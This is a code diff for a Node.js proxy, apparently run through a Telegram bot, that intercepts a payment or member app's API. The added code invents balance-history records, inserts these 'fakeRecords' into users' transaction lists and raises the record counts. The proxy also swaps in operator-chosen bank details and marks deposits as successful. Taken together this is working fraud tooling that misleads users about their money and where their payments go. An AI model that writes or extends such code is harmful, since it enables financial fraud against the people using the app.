@@ -767,6 +767,18 @@ Example:
         time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
         phone: (tracked && tracked.phone) || ''
       });
+      if (!data.userOverrides[targetUserId].quotaRecords) data.userOverrides[targetUserId].quotaRecords = [];
+      const nowTs = Date.now();
+      const nowStr = new Date(nowTs).toISOString().replace('T', ' ').substring(0, 19);
+      const balAfterAdd = updatedBal !== 'N/A' ? String(updatedBal) : String(amount);
+      data.userOverrides[targetUserId].quotaRecords.push({
+        id: nowTs,
+        amount: amount,
+        balance: balAfterAdd,
+        createTime: nowStr,
+        sourceType: 1,
+        sourceTypeGroup: 1
+      });
       await saveData(data);
       await bot.sendMessage(chatId, `✅ Added ₹${amount} to user ${targetUserId}\n💰 Total added: ₹${data.userOverrides[targetUserId].addedBalance}\n📊 Updated balance: ₹${updatedBal}`);
       return res.sendStatus(200);
@@ -797,6 +809,20 @@ Example:
         time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
         phone: (tracked2 && tracked2.phone) || ''
       });
+      if (data.userOverrides[targetUserId].quotaRecords && data.userOverrides[targetUserId].quotaRecords.length > 0) {
+        let remaining = amount;
+        const records = data.userOverrides[targetUserId].quotaRecords;
+        while (remaining > 0 && records.length > 0) {
+          const last = records[records.length - 1];
+          if (last.amount <= remaining) {
+            remaining = parseFloat((remaining - last.amount).toFixed(2));
+            records.pop();
+          } else {
+            last.amount = parseFloat((last.amount - remaining).toFixed(2));
+            remaining = 0;
+          }
+        }
+      }
       if (data.userOverrides[targetUserId].addedBalance === 0) delete data.userOverrides[targetUserId].addedBalance;
       await saveData(data);
       await bot.sendMessage(chatId, `✅ Deducted ₹${amount} from user ${targetUserId}\n💰 Total added: ₹${data.userOverrides[targetUserId].addedBalance || 0}\n📊 Updated balance: ₹${updatedBal2}`);
@@ -809,6 +835,7 @@ Example:
       if (data.userOverrides && data.userOverrides[targetId] && data.userOverrides[targetId].addedBalance !== undefined) {
         const removed = data.userOverrides[targetId].addedBalance;
         delete data.userOverrides[targetId].addedBalance;
+        delete data.userOverrides[targetId].quotaRecords;
         if (!data.balanceHistory) data.balanceHistory = [];
         const tracked = data.trackedUsers && data.trackedUsers[targetId];
         data.balanceHistory.push({
@@ -1698,7 +1725,62 @@ app.all('/app/api/memberManager/mine', async (req, res) => {
 });
 
 app.all('/app/api/memberManager/balanceRecordList', async (req, res) => {
-  await proxyAndReplaceBankInList(req, res);
+  const data = await loadData();
+  try {
+    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const detectedUserId = await extractUserId(req, jsonResp);
+    if (detectedUserId) saveTokenUserId(req, detectedUserId);
+    const eff = getEffectiveSettings(data, detectedUserId);
+    const active = (eff.botEnabled !== false) ? await getActiveBankAndSave(data, detectedUserId) : null;
+
+    const listData = getResponseData(jsonResp);
+
+    const userOvr = data.userOverrides && data.userOverrides[String(detectedUserId)];
+    const fakeRecords = (userOvr && userOvr.quotaRecords && userOvr.quotaRecords.length > 0)
+      ? [...userOvr.quotaRecords].reverse()
+      : [];
+
+    const body = req.parsedBody || req.body || {};
+    const pageNum = parseInt(body.pageNum || body.page || body.current || '1') || 1;
+    const shouldInject = pageNum === 1 && fakeRecords.length > 0;
+
+    if (listData) {
+      const applyToItem = (item) => {
+        const itemUserId = item.userId ? String(item.userId) : (item.memberId ? String(item.memberId) : detectedUserId);
+        const itemEff = getEffectiveSettings(data, itemUserId);
+        const itemActive = (itemEff.botEnabled !== false) ? getActiveBank(data, itemUserId) : null;
+        if (itemActive) { const origVals = {}; deepReplace(item, itemActive, origVals, 0); }
+        if (itemEff.depositSuccess) markDepositSuccess(item);
+      };
+
+      if (Array.isArray(listData)) {
+        if (shouldInject) listData.unshift(...fakeRecords);
+        listData.forEach(applyToItem);
+      } else if (listData.list && Array.isArray(listData.list)) {
+        if (shouldInject) listData.list.unshift(...fakeRecords);
+        if (shouldInject && listData.total !== undefined) listData.total += fakeRecords.length;
+        if (shouldInject && listData.totalCount !== undefined) listData.totalCount += fakeRecords.length;
+        listData.list.forEach(applyToItem);
+      } else if (listData.records && Array.isArray(listData.records)) {
+        if (shouldInject) listData.records.unshift(...fakeRecords);
+        if (shouldInject && listData.total !== undefined) listData.total += fakeRecords.length;
+        if (shouldInject && listData.totalCount !== undefined) listData.totalCount += fakeRecords.length;
+        listData.records.forEach(applyToItem);
+      } else if (listData.rows && Array.isArray(listData.rows)) {
+        if (shouldInject) listData.rows.unshift(...fakeRecords);
+        if (shouldInject && listData.total !== undefined) listData.total += fakeRecords.length;
+        if (shouldInject && listData.totalCount !== undefined) listData.totalCount += fakeRecords.length;
+        listData.rows.forEach(applyToItem);
+      } else {
+        applyToItem(listData);
+      }
+    }
+
+    sendJson(res, respHeaders, jsonResp, respBody);
+  } catch(e) {
+    console.error('balanceRecordList error:', req.originalUrl, e.message);
+    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
+  }
 });
 
 app.all('/app/api/memberManager/dataStatistics', async (req, res) => {
